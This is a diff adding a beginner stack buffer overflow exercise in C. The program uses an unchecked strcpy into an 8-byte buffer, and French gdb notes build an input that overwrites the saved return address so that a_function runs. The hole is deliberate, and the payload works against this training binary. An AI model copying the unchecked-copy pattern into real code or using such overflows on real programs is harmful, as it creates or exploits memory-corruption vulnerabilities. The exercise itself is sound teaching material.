@@ -1,0 +1,32 @@
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+
+void a_function(void) {
+    printf("Try to have this function called by overriding the saved RIP on the stack.");
+}
+
+
+int main(int ac, char **av) {
+    int an_int = 1;
+    char a_string[8] = "BBBBBBB";
+    char user_input[8] = {};
+
+    if (ac != 2) {
+        printf("Please give an argument\n");
+        exit(1);
+    }
+    strcpy(user_input, av[1]);
+    printf("%i, %s, %s\n", an_int, a_string, user_input);
+}
+
+nano ex2.c           // écrit et modifier
+gcc ex2.c -o C2 -g   // compiler
+gbw C2
+b main
+run
+r $'AAAAABBBBBCCCCCEEEEEFFFFFGGGGGHHHHHIIIIJJJJJ  // pour savoir le nombre de charactère néssésaire pour écrase se que l'on shouaite
+p a_function         // addresse qu'on veux mettre 
+r $'AAAAABBBBBCCCCCEEEEEFFFFFGGGGGHHH\x69\x51\x55\x55\x55\x55'
+si                   // Avancer d'une instruction assembleur
+n                    // Avancer d'une ligne en C
